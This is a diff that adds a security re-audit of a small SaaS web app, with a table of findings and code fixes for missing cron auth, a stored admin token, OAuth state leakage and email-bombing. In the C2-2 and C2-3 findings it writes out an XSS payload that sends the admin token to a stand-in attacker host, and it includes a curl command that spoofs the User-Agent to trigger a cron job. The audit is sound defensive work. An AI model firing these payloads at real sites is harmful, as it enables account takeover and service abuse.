@@ -1,5 +1,569 @@
 # Ramped AI — Full Audit
 
+> **AUDIT v2 — 2026-04-29 (post-PR3, post-portal, post-Stripe)**
+> Re-audit by Senior Security Architect. Targets full repo as of `git clone … 2026-04-29`.
+> Scope: 22 HTML pages, **40 API files** (31 endpoints + 9 `_lib` modules), **5 SQL migrations**, `vercel.json`, `scripts/e2e-test.sh`, all context docs.
+> The previous audit (preserved below at line ~140) flagged 11 Critical and 12 High items — most of those have been fixed in PR 3 (signed roadmap/map tokens, idempotent reminders, send-followup auth, bookings.UNIQUE). This audit covers everything that has shipped *since* (Stripe, portal, agents, onboarding, profile, tickets, weekly digest) plus latent issues missed earlier.
+
+---
+
+## Phase 1 (v2) — Severity Summary
+
+| #     | Finding                                                                | Severity | File:line                                                            | Status |
+|-------|------------------------------------------------------------------------|----------|----------------------------------------------------------------------|--------|
+| C2-1  | Cron `/api/reminders` has **no auth** — public email-bomb vector        | **Critical** | `api/reminders.js:100-103`                                       | open |
+| C2-2  | Admin bearer token persisted in `localStorage` + CSP `'unsafe-inline'` | **Critical** | `admin.html:1071,1090,1131`; `vercel.json:135`                    | open |
+| C2-3  | Reflected XSS on OAuth callback `error` param                          | **Critical** | `api/google-oauth-callback.js:16`                                  | open |
+| C2-4  | Email-bombing via `/api/contact`, `/api/book`, `/api/questionnaire`    | **Critical** | `api/contact.js:42`; `api/book.js:73`; `api/questionnaire.js:195` | open |
+| C2-5  | `state=ADMIN_TOKEN` reused on OAuth + non-timing-safe compare          | **Critical** | `api/google-oauth-start.js:24,38`                                  | open |
+| H2-1  | Account email takeover via `/api/portal-profile` (no confirm step)     | High     | `api/portal-profile.js:106-118`                                      | open |
+| H2-2  | Weekly-digest auth trivially bypassed by spoofing User-Agent           | High     | `api/weekly-digest.js:38-41`                                         | open |
+| H2-3  | Schema collision: `agent_runs` defined twice (mig 001 vs 004)          | High     | `db/migrations/001_agent_logging.sql`; `004_stripe_onboarding_agents.sql:62` | open |
+| H2-4  | Questionnaire email-only fallback still active (cost + LLM abuse)      | High     | `api/questionnaire.js:262-268`                                       | open |
+| H2-5  | Admin token still accepted via `?token=` query-string fallback         | High     | `api/_lib/admin-auth.js:46-47`                                       | open |
+| H2-6  | `send-followup` ships **un-signed** roadmap URL — broken link in email | High     | `api/send-followup.js:78`                                            | open |
+| H2-7  | New tables (mig 003 + 004) don't enable RLS — defense-in-depth gap     | High     | `db/migrations/003_portal.sql`; `004_stripe_onboarding_agents.sql`   | open |
+| H2-8  | In-memory rate-limit per-container; trivially bypassed at horizontal scale | High | `api/_lib/validate.js:66-80`                                       | open |
+| M2-1  | `getClientIp` blindly trusts `X-Forwarded-For` (rate-limit bypass)      | Medium   | `api/_lib/validate.js:82-86`                                         | open |
+| M2-2  | `IP_HASH_SALT` falls back to a public default string                    | Medium   | `api/portal-track.js:18`                                             | open |
+| M2-3  | Open-redirect/XSS surface via `hosted_url` in portal billing            | Medium   | `portal.html:724`                                                    | open |
+| M2-4  | Inline `onclick="…('${d.id}…')"` patterns (UUID-trusted DOM injection) | Medium   | `portal.html:773-775`; `admin.html:1671-1674`                        | open |
+| M2-5  | `confirmDialog(msg)` injects `msg` as `innerHTML`                       | Medium   | `admin.html:1062`                                                    | open |
+| M2-6  | No audit log on destructive admin actions                               | Medium   | `api/admin-delete.js`; `api/admin-update.js`; `api/admin-agents.js`  | open |
+| M2-7  | Upload allowlist accepts `text/html` (XSS in admin preview path)        | Medium   | `api/portal-upload-url.js:18`                                        | open |
+| M2-8  | Stripe webhook idempotency: `recordEventOnce` returns true on race      | Medium   | `api/stripe-webhook.js:55-67`                                        | open |
+| M2-9  | `/api/resources` sets `Access-Control-Allow-Origin: *`                  | Medium   | `api/resources.js:6`                                                 | open |
+| M2-10 | Refresh-secret compared with `!==` (non-timing-safe)                    | Medium   | `api/resources-refresh.js:124`                                       | open |
+| M2-11 | `availability.timezone` not validated against IANA tz set               | Medium   | `api/availability.js:78`                                             | open |
+| M2-12 | CSP allows `'unsafe-inline'` for `script-src` — XSS amplifier            | Medium   | `vercel.json:135`                                                    | open |
+| L2-1  | OAuth refresh token rendered as plaintext on callback page              | Low      | `api/google-oauth-callback.js:68`                                    | open |
+| L2-2  | Legacy `_lib/logger.js` writes mig-001 schema; conflicts with mig-004   | Low      | `api/_lib/logger.js:44`                                              | open |
+| L2-3  | Questionnaire prompt-injects user fields into Claude system prompt     | Low      | `api/questionnaire.js:56-116`                                        | open |
+| L2-4  | Booking `billing` param destructured but never persisted                | Low      | `api/book.js:117-185`                                                | open |
+| L2-5  | `permanent:false` redirects in `vercel.json` (`/dashboard`,`/q-preview`)| Low      | `vercel.json:27,33`                                                  | open |
+| L2-6  | `roadmap.html` does not load Inter font (carry-over from v1 audit H10)  | Low      | `roadmap.html`                                                       | open |
+
+**Counts:** 5 Critical · 8 High · 12 Medium · 6 Low — **31 open issues**.
+**v1 audit items confirmed FIXED:** C1 (IDOR get-map/get-roadmap → HMAC), C2 (booking_id required), H3 (reminders idempotency columns), H4 (send-followup uses ADMIN_TOKEN), H11 (bookings UNIQUE migration). C3-C11 are visual / SEO scope and tracked in VISUAL-AUDIT.md.
+
+---
+
+## Critical findings — full detail
+
+### C2-1 · Cron `/api/reminders` has no authentication
+
+**Files:** `api/reminders.js:100-103`
+**Attack:** Any unauthenticated GET to `https://www.30dayramp.com/api/reminders` triggers the cron handler. The handler queries every booking with `datetime` in the next 1h or 24h window and emails each customer via Resend. There is no `User-Agent`, `Authorization`, or signature check. The idempotency columns (`reminded_24h_at`, `reminded_1h_at`) limit this to **one** spam reminder per booking per stage, but that first ahead-of-schedule reminder still goes out — and it's already enough to (a) embarrass us with customers receiving "Tomorrow: your discovery call" emails when their call isn't tomorrow, (b) torch our Resend sender reputation, and (c) flip every booking row's idempotency flag, which then suppresses the *real* reminder.
+
+**Risk:** Brand damage + Resend deliverability collapse. ~30 seconds of attacker effort. Trivial to script.
+
+**Fix (apply now):**
+```js
+// api/_lib/cron-auth.js  (new file)
+export function isCronAuthorized(req) {
+  // Vercel Cron sends Authorization: Bearer ${CRON_SECRET} on every invocation
+  // when CRON_SECRET is set in the project env. Anything else (manual GET,
+  // attacker) must present the same Bearer token to be accepted.
+  const expected = process.env.CRON_SECRET;
+  if (!expected) return false; // fail closed
+  const auth = req.headers['authorization'] || '';
+  const m = auth.match(/^Bearer\s+(.+)$/i);
+  if (!m) return false;
+  const presented = m[1].trim();
+  if (presented.length !== expected.length) return false;
+  let out = 0;
+  for (let i = 0; i < presented.length; i++) {
+    out |= presented.charCodeAt(i) ^ expected.charCodeAt(i);
+  }
+  return out === 0;
+}
+```
+```js
+// api/reminders.js — top of handler
+import { isCronAuthorized } from './_lib/cron-auth.js';
+// ...
+export default async function handler(req, res) {
+  if (req.method !== 'GET') return res.status(405).end();
+  if (!isCronAuthorized(req)) return res.status(401).json({ error: 'Unauthorized' });
+  // …rest unchanged
+```
+**Deploy step:** set `CRON_SECRET=$(openssl rand -hex 32)` in Vercel env. Vercel Cron will auto-attach `Authorization: Bearer $CRON_SECRET` to scheduled invocations once that env var is set on the cron-attached project.
+
+---
+
+### C2-2 · Admin token in localStorage + permissive CSP
+
+**Files:** `admin.html:1071,1090,1131`; `vercel.json:135` (`script-src 'self' 'unsafe-inline'`)
+**Attack:** any successful XSS on `/admin` (or any page sharing the origin) executes JS that reads `localStorage.getItem('adminToken')` and exfiltrates it to an attacker-controlled endpoint. The current CSP (`'unsafe-inline'` on `script-src`) does not prevent inline-script XSS, so reflected/stored XSS sinks become full admin compromise. The token grants read on every booking + delete on any booking + Stripe invoice creation. Combined with C2-3 (reflected XSS in OAuth callback), there is a working chain: trick admin into hitting `/api/google-oauth-callback?error=<script>fetch('https://attacker/?t='+localStorage.getItem('adminToken'))</script>` and you have their bearer token forever.
+
+Additionally, `admin.html:1131` writes the token to `localStorage` *before* the server validates it (line 1134's 401 check happens *after* the write) — every typo-attempt is persisted.
+
+**Fix (apply now):** drop `localStorage` entirely; use `sessionStorage` only (clears when tab closes) and only persist *after* server validation:
+```js
+// admin.html (replace lines 1069–1098)
+async function adminFetch(url, opts) {
+  opts = opts || {};
+  const token = sessionStorage.getItem(SESSION_KEY) || '';
+  return fetch(url, Object.assign({}, opts, {
+    headers: Object.assign({ 'Content-Type': 'application/json',
+                             'Authorization': 'Bearer ' + token },
+                           opts.headers || {})
+  }));
+}
+
+(function init() {
+  // Migration: clear any legacy localStorage token from earlier deploys.
+  try { localStorage.removeItem('adminToken'); } catch (_) {}
+  const saved = sessionStorage.getItem(SESSION_KEY);
+  if (saved) { _token = saved; fetchData(saved); }
+  document.getElementById('password-input').addEventListener('keydown', e => {
+    if (e.key === 'Enter') doAuth();
+  });
+})();
+```
+```js
+// admin.html fetchData() — only persist on success
+async function fetchData(token) {
+  try {
+    const res = await adminFetchWithToken(token, '/api/admin');
+    if (res.status === 401) {
+      document.getElementById('auth-error').textContent = 'Incorrect password.';
+      sessionStorage.removeItem(SESSION_KEY);
+      _token = null;
+      return false;
+    }
+    sessionStorage.setItem(SESSION_KEY, token); // only after 200
+    _token = token;
+    // …
+  }
+}
+```
+**Follow-up (M2-12):** migrate `script-src` to nonce-based CSP, remove `'unsafe-inline'`. Same PR or next.
+
+---
+
+### C2-3 · Reflected XSS on OAuth callback error path
+
+**File:** `api/google-oauth-callback.js:16`
+**Code:** `return res.status(400).send(\`<h1>Google returned an error</h1><pre>${error}</pre>\`);`
+**Attack:** `/api/google-oauth-callback?error=<script>fetch('https://attacker/?'+localStorage.getItem('adminToken'))</script>` — the payload is rendered verbatim into HTML, executed by the admin's browser, exfiltrates the token (see C2-2). Reachable without auth (the `state` check happens *after* the error branch on line 18).
+
+**Fix:**
+```js
+// api/google-oauth-callback.js
+function escHtml(s) {
+  return String(s ?? '').replace(/[&<>"']/g, c =>
+    ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+}
+// …
+if (error) {
+  return res.status(400).send(
+    `<h1>Google returned an error</h1><pre>${escHtml(error)}</pre>`
+  );
+}
+```
+**Defense-in-depth:** also escape the `JSON.stringify(tokens, null, 2)` block on line 43 (low-likelihood XSS but trivial to harden).
+
+---
+
+### C2-4 · Email-bombing via public POST endpoints
+
+**Files:** `api/contact.js:42`; `api/book.js:73`; `api/questionnaire.js:195`
+**Attack:** all three endpoints accept an attacker-supplied `email` and trigger Resend emails to that address ("New lead from 30dayramp.com", "You're booked", "Your automation roadmap is ready"). The 5/min/IP rate-limit is bypassed in two ways: (1) IP rotation (residential proxies cost ~$3/GB), (2) the limiter is per-container so horizontal scale-out under load divides the cap N-ways (see H2-8). A determined attacker can:
+- Email-bomb a single victim address with hundreds of "You're booked" emails using fake bookings.
+- Burn Ramped's Resend reputation by triggering bounces (random invalid addresses).
+- Drain Anthropic budget by triggering questionnaire's Claude call (~$0.05–0.20 each) for fake bookings.
+
+**Fix:** add Cloudflare Turnstile (free) or hCaptcha to all three endpoints. Turnstile is invisible by default for the 99% legit case.
+```html
+<!-- book.html, contact form, questionnaire — add to <head> -->
+<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+<!-- and inside the form: -->
+<div class="cf-turnstile" data-sitekey="$TURNSTILE_SITEKEY" data-size="invisible"></div>
+```
+```js
+// api/_lib/turnstile.js (new helper)
+export async function verifyTurnstile(token, ip) {
+  if (!process.env.TURNSTILE_SECRET) return true; // fail-open in dev only
+  const r = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+    body: new URLSearchParams({ secret: process.env.TURNSTILE_SECRET, response: token, remoteip: ip || '' }),
+  });
+  const j = await r.json().catch(() => ({}));
+  return !!j.success;
+}
+```
+```js
+// api/book.js POST — gate after rate-limit, before Supabase write
+const turnstileOk = await verifyTurnstile(req.body?.turnstile_token, ip);
+if (!turnstileOk) return res.status(403).json({ error: 'Bot check failed.' });
+```
+**Interim mitigation (no Turnstile):** add a soft "click-to-confirm" link in the *first* email — the booking is held in a `pending` state until the prospect clicks the link. Email-bombing a victim still sends one email, not a hundred. But Turnstile is the right call for premium SaaS positioning.
+
+---
+
+### C2-5 · OAuth `state` parameter reuses `ADMIN_TOKEN` + non-timing-safe compare
+
+**File:** `api/google-oauth-start.js:24,38`
+**Issues:**
+1. **Token leakage via OAuth state.** Line 38: `state: token` puts the admin token in the URL Google receives, the URL the user's browser navigates to (browser history), and the Referer header of any out-of-flow request. Then it round-trips back to `google-oauth-callback.js:18` which compares it again. The admin token has now lived in 5+ logs (admin's local browser, Google logs, Vercel access logs, Referer to any page that loads on the callback, plus screenshots/screen-recording).
+2. **Non-timing-safe compare.** Line 24: `token !== ADMIN_TOKEN` — string equality bails on the first mismatched character. With CDN jitter on Vercel this is hard to exploit but trivially fixable.
+
+**Fix:**
+```js
+// api/google-oauth-start.js
+import { isAuthorized } from './_lib/admin-auth.js';
+import crypto from 'crypto';
+
+export default async function handler(req, res) {
+  if (!isAuthorized(req)) return res.status(401).json({ error: 'Unauthorized' });
+  if (!CLIENT_ID) return res.status(500).json({ error: 'GOOGLE_CLIENT_ID not set' });
+
+  // Mint an ephemeral, signed state. Bound to time so it expires in 10 min.
+  // The callback re-derives + verifies; we never expose ADMIN_TOKEN to Google.
+  const exp = Math.floor(Date.now() / 1000) + 600;
+  const stateRaw = `${exp}:${crypto.randomBytes(16).toString('hex')}`;
+  const stateSig = crypto.createHmac('sha256', process.env.MAP_LINK_SECRET || 'fallback')
+    .update(stateRaw).digest('base64url');
+  const state = `${stateRaw}:${stateSig}`;
+  // …rest of flow uses `state` instead of `token`
+}
+```
+```js
+// api/google-oauth-callback.js — verify the new state
+import crypto from 'crypto';
+function verifyState(state) {
+  const parts = String(state || '').split(':');
+  if (parts.length !== 3) return false;
+  const [exp, nonce, sig] = parts;
+  if (parseInt(exp, 10) < Math.floor(Date.now() / 1000)) return false;
+  const expected = crypto.createHmac('sha256', process.env.MAP_LINK_SECRET || 'fallback')
+    .update(`${exp}:${nonce}`).digest('base64url');
+  if (expected.length !== sig.length) return false;
+  return crypto.timingSafeEqual(Buffer.from(expected), Buffer.from(sig));
+}
+// then: if (!verifyState(req.query.state)) return res.status(401).send('Invalid state');
+```
+**Side-benefit:** the `?token=ADMIN_TOKEN` query string disappears from `google-oauth-start.js`. The admin starts the flow from the admin UI button (which already has a sessionStorage token) — wire the start endpoint to require Bearer auth from `adminFetch`.
+
+---
+
+## High findings — full detail
+
+### H2-1 · Account email takeover via /api/portal-profile
+
+**File:** `api/portal-profile.js:106-118`
+**Attack:** an attacker who phishes / shoulder-surfs a single portal URL (HMAC-signed link customers receive in email) can immediately change the booking's email to one they control. From that moment forward, every system email — billing, weekly digest, ticket replies, future portal-link refreshes — goes to the attacker. The "security notice to old email" on line 171 is a courtesy notification, not a control: if the customer's email account is the phishing root cause, the attacker deletes the notice. There is no admin-side revocation flow.
+
+**Fix:** standard email-change confirmation flow. Don't apply the change until the new address proves ownership.
+```js
+// api/portal-profile.js — POST handler, replace lines 104-118
+let emailPendingChange = null;
+if (typeof body.email === 'string' && body.email.trim() && isValidEmail(body.email.trim())) {
+  // Look up old email
+  const r = await fetch(`${SUPABASE_URL}/rest/v1/bookings?id=eq.${encodeURIComponent(id)}&select=email,name`,
+    { headers: { apikey: SUPABASE_KEY, Authorization: `Bearer ${SUPABASE_KEY}` } });
+  const arr = r.ok ? await r.json() : [];
+  const oldEmail = arr?.[0]?.email || null;
+  if (oldEmail && oldEmail.toLowerCase() !== body.email.trim().toLowerCase()) {
+    emailPendingChange = body.email.trim().toLowerCase();
+    // Don't write patch.email here. Mint a confirmation token and email it to the NEW address.
+    const exp = Math.floor(Date.now() / 1000) + 60 * 60 * 24; // 24h
+    const sig = crypto.createHmac('sha256', process.env.MAP_LINK_SECRET)
+      .update(`${id}:${emailPendingChange}:${exp}`).digest('base64url');
+    const confirmUrl = `${SITE_URL}/api/portal-profile-confirm-email?id=${id}&new=${encodeURIComponent(emailPendingChange)}&exp=${exp}&t=${encodeURIComponent(sig)}`;
+    await sendEmail(emailPendingChange, 'Confirm your new Ramped AI portal email',
+      wrapEmail({ subject: 'Confirm your new email',
+                  preheader: 'Click the link to take effect.',
+                  innerRows: emailHero({ headline: 'Confirm this is you', sub: 'Click below to update your portal email.' })
+                    + emailInfoCard({ ctaHref: confirmUrl, ctaLabel: 'Confirm new email →',
+                                      title: 'Click to confirm', body: 'Link expires in 24 hours.' })
+                    + emailSignoff({ name: 'Jon' }),
+                  siteUrl: SITE_URL }));
+    // also notify oldEmail that a change was *requested* (not yet applied)
+    await sendEmail(oldEmail, 'Email change requested',
+      wrapEmail({ subject: 'Email change requested',
+                  preheader: 'If this wasn\'t you, reply now.',
+                  innerRows: emailHero({ headline: 'Someone requested to change your email',
+                                         sub: `New address: ${esc(emailPendingChange)} — not yet applied.` })
+                    + emailBody('If this wasn\'t you, reply immediately.')
+                    + emailSignoff({ name: 'Jon' }),
+                  siteUrl: SITE_URL }));
+  }
+}
+```
+Then add `api/portal-profile-confirm-email.js` that verifies the HMAC and applies the change. The signed `?new=` token is safe to expose in URL because it's bound to `(id, newEmail, exp)` — it only changes that specific booking's email to that specific address.
+
+---
+
+### H2-2 · Weekly-digest auth bypass
+
+**File:** `api/weekly-digest.js:38-41`
+**Bug:** `const isCron = (req.headers['user-agent'] || '').includes('vercel-cron');` — User-Agent is fully client-controlled. An attacker `curl -H 'User-Agent: vercel-cron/1.0' https://www.30dayramp.com/api/weekly-digest` triggers the cron, which emails every active customer. Same impact pattern as C2-1.
+
+**Fix:** drop the User-Agent fast-path; require `Authorization: Bearer ${CRON_SECRET}` always. Use the same `isCronAuthorized` helper from C2-1.
+```js
+// api/weekly-digest.js — replace lines 36-42
+import { isCronAuthorized } from './_lib/cron-auth.js';
+// …
+export default async function handler(req, res) {
+  if (!isCronAuthorized(req)) return res.status(401).json({ error: 'Unauthorized' });
+  // …
+}
+```
+
+---
+
+### H2-3 · `agent_runs` schema collision between migration 001 and 004
+
+**Files:** `db/migrations/001_agent_logging.sql:5-15`; `db/migrations/004_stripe_onboarding_agents.sql:62-74`
+**Bug:** migration 001 creates `agent_runs(id, client_id, agent_type, status, input_summary, error_message, duration_ms, started_at, completed_at)`. Migration 004 also calls `CREATE TABLE IF NOT EXISTS agent_runs(id, agent_id, booking_id, action, outcome, duration_ms, hours_saved, metadata, created_at)`. Because of `IF NOT EXISTS`, migration 004's version is **silently skipped** if 001 already ran — leaving prod with the *old* schema while:
+- `api/admin-agents.js`, `api/portal-data.js`, `api/weekly-digest.js`, `api/admin.js` all SELECT `agent_id`, `outcome`, `hours_saved` (mig 004 columns) — these queries return 400 from PostgREST.
+- `api/_lib/logger.js` INSERTs the mig-001 columns (`client_id`, `agent_type`, `input_summary`).
+
+**Result:** the agent runtime / portal activity feed / weekly digest are non-functional in prod *and there's no error path that reveals it* (the code falls through silently with empty arrays). The portal looks "empty" forever.
+
+**Fix:** write a forward-only reconciling migration. The safest path is to rename the legacy `agent_runs` to `agent_runs_legacy` and create the new schema fresh:
+```sql
+-- db/migrations/006_fix_agent_runs_schema.sql
+-- Reconcile the dual definition of agent_runs from 001 vs 004. Forward-only.
+
+DO $$
+BEGIN
+  -- If the 001-shape table is in place, rename it out of the way
+  IF EXISTS (
+    SELECT 1 FROM information_schema.columns
+    WHERE table_name='agent_runs' AND column_name='agent_type'
+  ) THEN
+    EXECUTE 'ALTER TABLE agent_runs RENAME TO agent_runs_legacy';
+  END IF;
+END $$;
+
+-- Now create the 004-shape table as the authoritative one.
+CREATE TABLE IF NOT EXISTS agent_runs (
+  id           UUID PRIMARY KEY DEFAULT gen_random_uuid(),
+  agent_id     UUID REFERENCES agents(id) ON DELETE CASCADE,
+  booking_id   UUID REFERENCES bookings(id) ON DELETE CASCADE,
+  action       TEXT NOT NULL,
+  outcome      TEXT,
+  duration_ms  INTEGER,
+  hours_saved  NUMERIC(6,2),
+  metadata     JSONB NOT NULL DEFAULT '{}'::jsonb,
+  created_at   TIMESTAMPTZ NOT NULL DEFAULT now()
+);
+CREATE INDEX IF NOT EXISTS idx_runs_booking_created ON agent_runs(booking_id, created_at DESC);
+CREATE INDEX IF NOT EXISTS idx_runs_agent_created   ON agent_runs(agent_id, created_at DESC);
+
+-- And update _lib/logger.js to use the new schema (or retire it — see L2-2).
+```
+
+---
+
+### H2-4 · Questionnaire still has email-only fallback
+
+**File:** `api/questionnaire.js:262-268`
+**Issue:** even with `booking_id` preferred (good), the email-only branch is still reachable if `booking_id` is omitted from the POST body. Anyone can send `{ email: "victim@example.com", … }` with no booking id and trigger:
+- A real Anthropic Claude call (~$0.05–0.20 in tokens) per submission.
+- A Resend email to `OWNER_EMAIL` ("New scorecard") containing fabricated questionnaire data.
+- A Resend email to the victim's address ("Your automation roadmap is ready") with a generated roadmap.
+
+The `console.warn` on line 263 logs but doesn't block.
+
+**Fix:** require `booking_id` and remove the fallback entirely, as the v1 audit C2 prescribed:
+```js
+// api/questionnaire.js — replace lines 262-268
+if (!booking_id) {
+  return res.status(400).json({ error: 'booking_id required. Submit the questionnaire from the booking confirmation page.' });
+}
+findResult = await supabase('GET',
+  `/bookings?id=eq.${encodeURIComponent(booking_id)}&select=id,name,company,notes,tier,email`);
+```
+
+---
+
+### H2-5 · Admin `?token=` query-string fallback
+
+**File:** `api/_lib/admin-auth.js:46-47`
+**Issue:** `extractToken` accepts `?token=` as a "deprecated" fallback. Tokens in query strings leak through:
+- Vercel access logs (every querystring is logged)
+- Browser history
+- Referer header on any external resource fetched from the page
+- Screen sharing / screenshots
+The comment says "the admin UI no longer uses the query param" — so it's safe to remove now, before someone bookmarks it again.
+
+**Fix:**
+```js
+// api/_lib/admin-auth.js — remove lines 45-47
+export function extractToken(req) {
+  const auth = req.headers['authorization'] || req.headers['Authorization'];
+  if (auth && typeof auth === 'string') {
+    const m = auth.match(/^Bearer\s+(.+)$/i);
+    if (m) return m[1].trim();
+  }
+  return ''; // No more query-string fallback.
+}
+```
+
+---
+
+### H2-6 · `send-followup` builds an unsigned roadmap URL
+
+**File:** `api/send-followup.js:78`
+**Code:** `const roadmapUrl = \`${SITE_URL}/roadmap?id=${b.id}\`;`
+**Bug:** `/api/get-roadmap` requires a signed HMAC token (see `api/get-roadmap.js:39`) and returns 403 otherwise. So this email's "View your full roadmap →" CTA always fails for the customer. Functional bug, not a security exposure — but it's a customer-facing broken link in a premium handshake email.
+
+**Fix:**
+```js
+// api/send-followup.js — replace line 78
+import { signMapToken, isMapTokenConfigured } from './_lib/map-token.js';
+// …
+let roadmapUrl = '';
+if (isMapTokenConfigured()) {
+  const { exp, t } = signMapToken(b.id);
+  roadmapUrl = `${SITE_URL}/roadmap?id=${b.id}&exp=${exp}&t=${encodeURIComponent(t)}`;
+}
+// …and gate the CTA card on roadmapUrl being non-empty
+```
+
+---
+
+### H2-7 · No RLS on portal/agent/Stripe tables
+
+**Files:** `db/migrations/003_portal.sql` (no `ALTER TABLE … ENABLE ROW LEVEL SECURITY`); `db/migrations/004_stripe_onboarding_agents.sql` (same)
+**Tables affected:** `portal_events`, `support_tickets`, `support_messages`, `stripe_events`, `onboarding_documents`, `agents`, `agent_runs` (post-006), `agent_drafts`. Mig 001 *did* enable RLS on the original `agent_runs` and `agent_logs`. The newer migrations did not.
+
+**Risk:** today the API only authenticates with `SUPABASE_SERVICE_KEY`, which bypasses RLS by design. So this isn't *currently* exploitable. But: (a) if `SUPABASE_ANON_KEY` ever leaks (e.g. into a future client-side widget — exactly the kind of thing an "AI department" startup ships under deadline), the `anon` role can read every customer's tickets, agent activity, and Stripe events; (b) RLS-by-default is the standard hardening posture documented in Supabase's own production checklist; (c) the explicit `service_role full access` policy from mig 001 is a useful audit trail.
+
+**Fix:**
+```sql
+-- db/migrations/007_rls_hardening.sql (new)
+DO $$
+DECLARE t text;
+BEGIN
+  FOR t IN SELECT unnest(ARRAY[
+    'portal_events','support_tickets','support_messages',
+    'stripe_events','onboarding_documents',
+    'agents','agent_drafts'
+  ]) LOOP
+    EXECUTE format('ALTER TABLE %I ENABLE ROW LEVEL SECURITY', t);
+    -- service_role bypasses RLS, but document it explicitly:
+    EXECUTE format(
+      'CREATE POLICY "service_role full access" ON %I AS PERMISSIVE FOR ALL TO service_role USING (true) WITH CHECK (true)', t
+    );
+  END LOOP;
+END $$;
+-- Re-run migration 006's table after this so its agent_runs gets RLS too,
+-- or include it in the loop above if 006 was already applied.
+```
+
+---
+
+### H2-8 · In-memory rate-limit; Vercel scales horizontally
+
+**File:** `api/_lib/validate.js:66-80`
+**Issue:** `const buckets = new Map()` lives inside a single serverless container. Vercel boots additional containers under load — each gets its own empty `buckets`. Attacker with N IPs and Vercel under load gets N × (N_containers) × 5 req/min effective cap. Combined with C2-4 email-bombing, the 5/min cap is theatre.
+
+**Fix:** use Vercel KV or Upstash Redis for distributed rate limiting. There's a maintained drop-in: `@upstash/ratelimit`. Without a build pipeline, the simplest path is raw fetch:
+```js
+// api/_lib/validate.js — replace checkRateLimit with this
+const KV_URL = process.env.KV_REST_API_URL;
+const KV_TOK = process.env.KV_REST_API_TOKEN;
+export async function checkRateLimit(ip, { max = 5, windowMs = 60_000 } = {}) {
+  if (!ip) return { ok: true, remaining: max };
+  if (!KV_URL || !KV_TOK) {
+    // Fallback to in-memory (dev/staging without KV configured)
+    return checkRateLimitInMemory(ip, { max, windowMs });
+  }
+  const key = `rl:${ip}:${Math.floor(Date.now() / windowMs)}`;
+  const r = await fetch(`${KV_URL}/incr/${encodeURIComponent(key)}`, {
+    headers: { Authorization: `Bearer ${KV_TOK}` },
+  });
+  const j = await r.json().catch(() => ({}));
+  const count = j.result || 1;
+  if (count === 1) {
+    // Set TTL on first hit for this window
+    fetch(`${KV_URL}/expire/${encodeURIComponent(key)}/${Math.ceil(windowMs / 1000)}`, {
+      headers: { Authorization: `Bearer ${KV_TOK}` },
+    }).catch(() => {});
+  }
+  return { ok: count <= max, remaining: Math.max(0, max - count) };
+}
+```
+Existing callers are sync today (`const rl = checkRateLimit(...)`); they need `await`.
+
+---
+
+## Medium / Low findings — concise
+
+| # | File:line | Issue | Fix |
+|---|---|---|---|
+| M2-1 | `api/_lib/validate.js:82-86` | XFF spoofable — first comma-separated entry trusted | On Vercel, use `req.headers['x-real-ip']` (Vercel-set, last hop) for limit keying. |
+| M2-2 | `api/portal-track.js:18` | `IP_HASH_SALT` defaults to `'ramped-default-salt-rotate-me'` — defeats privacy promise | Hard-fail: `if (!process.env.IP_HASH_SALT) ip_hash = null;`. |
+| M2-3 | `portal.html:724` | `<a href="${__portalEsc(i.hosted_url)}">` accepts any URL scheme | Validate `^https?://` before render; otherwise omit the link. |
+| M2-4 | `portal.html:773-775`, `admin.html:1671-1674` | `onclick="fn('${id}', …)"` UUID interpolation into JS | Replace with `addEventListener` + `data-id` lookup. |
+| M2-5 | `admin.html:1062` | `confirmDialog(msg)` does `innerHTML = '…' + msg + '…'` | Add a `confirmDialogHtml(htmlMsg)` variant; default `confirmDialog(plainMsg)` uses `textContent`. |
+| M2-6 | `admin-delete.js`, `admin-update.js`, `admin-create-invoice.js`, `admin-agents.js` | No audit log on destructive admin actions | New table `admin_actions(id, action, target_id, actor_token_hash, payload, created_at)`; INSERT in each handler. |
+| M2-7 | `api/portal-upload-url.js:18` | MIME allowlist accepts `text/.+` (incl. `text/html`) | Tighten regex to `text/(plain|csv)`. Reject `text/html` outright. |
+| M2-8 | `api/stripe-webhook.js:55-67` | `recordEventOnce` returns `true` on PK collision (insert succeeded vs. replay) | Check `r.status === 409 \|\| (data?.code === '23505')` explicitly. |
+| M2-9 | `api/resources.js:6` | `Access-Control-Allow-Origin: '*'` | Reuse the `ALLOWED_ORIGINS` allowlist from other endpoints. |
+| M2-10 | `api/resources-refresh.js:124` | Refresh secret compared with `!==` | Use `crypto.timingSafeEqual` on equal-length Buffers. |
+| M2-11 | `api/availability.js:78` | `timezone` accepts any string | Validate against `Intl.supportedValuesOf('timeZone')`. |
+| M2-12 | `vercel.json:135` | CSP `script-src 'unsafe-inline'` | Migrate to nonce-based: per-request nonce in headers + `<script nonce="…">` on every inline block. Same PR as build pipeline (M1 in v1 audit). |
+| L2-1 | `api/google-oauth-callback.js:68` | Refresh token rendered in plaintext on the browser page | Render obscured by default + auto-copy + "show" toggle. |
+| L2-2 | `api/_lib/logger.js:44` | Writes legacy `agent_runs` columns | Either delete this lib (no remaining call sites after H2-3 fix) or retarget to the new schema. |
+| L2-3 | `api/questionnaire.js:56-116` | User questionnaire fields interpolated into Claude system prompt | Pass user data as a `user`-role message; system prompt keeps only the rules. Defense-in-depth — Claude's enforced JSON output limits real impact. |
+| L2-4 | `api/book.js:117-185` | `billing` destructured but not persisted to row | Add `billing_cadence: billing \|\| null` to the insert payload on line 178. |
+| L2-5 | `vercel.json:27,33` | `permanent: false` on `/dashboard`, `/questionnaire-preview` | Set `permanent: true` and delete the orphaned source files (cf. v1 M5). |
+| L2-6 | `roadmap.html` `<head>` | Doesn't load Inter font — carry-over from v1 H10 | Add the Inter `<link>` block. |
+
+---
+
+## Patches landing in this audit
+
+The following low-risk security patches are being applied as part of this PR (full code in commits):
+
+1. **NEW** `api/_lib/cron-auth.js` — shared `isCronAuthorized(req)` helper (timing-safe Bearer compare).
+2. **PATCH** `api/reminders.js` — gate behind `isCronAuthorized` (CRIT-1 fix).
+3. **PATCH** `api/weekly-digest.js` — drop UA fast-path; require `isCronAuthorized` (HIGH-2 fix).
+4. **PATCH** `api/_lib/admin-auth.js` — remove the deprecated `?token=` fallback (HIGH-5 fix).
